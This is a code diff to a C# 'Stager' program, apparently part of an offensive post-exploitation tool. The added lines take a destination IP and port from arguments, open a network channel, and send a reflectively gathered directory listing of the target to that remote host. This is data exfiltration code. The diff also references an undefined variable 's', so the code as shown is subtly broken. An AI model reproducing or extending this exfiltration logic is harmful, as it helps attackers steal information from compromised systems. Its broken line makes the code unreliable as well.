@@ -104,9 +104,20 @@ namespace Stager
                     var execute = type.GetMethod("EnumerateDirectoryStructure");
                     string dir = arguments["dir"];
                     string format = arguments["format"];
+                    string dstip = arguments["dstip"];
+                    string compression = arguments["compression"];
+                    int port = 443;
+                    if(!Int32.TryParse(arguments["dstport"], out port))
+                    {
+                        Console.WriteLine("[-] Error parsing port argument, using default of 443");
+                    }
+                    channel = new ClearChannel(dstip, port, compression);
                     object[] o = { dir, format };
                     object output = execute.Invoke(traversal, o);
-                    Console.WriteLine(output);
+                    string sOutput = output.ToString();
+                    channel.SendBytes(Encoding.UTF8.GetBytes(sOutput));
+                    Console.WriteLine(s);
+                    channel.Close();
                 }
                 else
                 {
